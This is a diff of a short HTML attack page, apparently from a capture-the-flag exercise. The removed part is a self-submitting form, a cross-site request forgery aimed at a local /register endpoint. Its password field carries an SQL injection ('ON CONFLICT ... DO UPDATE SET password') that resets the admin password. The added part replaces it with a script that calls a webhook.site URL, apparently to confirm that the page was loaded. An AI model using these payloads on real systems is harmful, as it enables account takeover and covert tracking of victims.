@@ -1,11 +1,24 @@
 <html>
   <body>
-    <form action="http://127.0.0.1/register" method="POST">
-      <input type="text" name="username" value=" admin"/>
-      <input type="text" name="password" value="admin') ON CONFLICT(username) DO UPDATE SET password = 'admin';--"/>
-    </form>
     <script>
-      document.forms[0].submit();
-    </script>
+  // Utilisez la fonction fetch pour effectuer une requête GET
+  fetch('https://webhook.site/0496b1c1-9913-4b2f-a3ac-50ee0bf25492')
+    .then(response => {
+      // Vérifiez si la requête a réussi
+      if (!response.ok) {
+        throw new Error('Erreur de requête : ' + response.statusText);
+      }
+      // Retournez la réponse sous forme de texte
+      return response.text();
+    })
+    .then(data => {
+      // Traitez la réponse de la requête ici
+      console.log('Réponse :', data);
+    })
+    .catch(error => {
+      // Gérez les erreurs de la requête ici
+      console.error('Erreur :', error);
+    });
+</script>
   </body>
 </html>
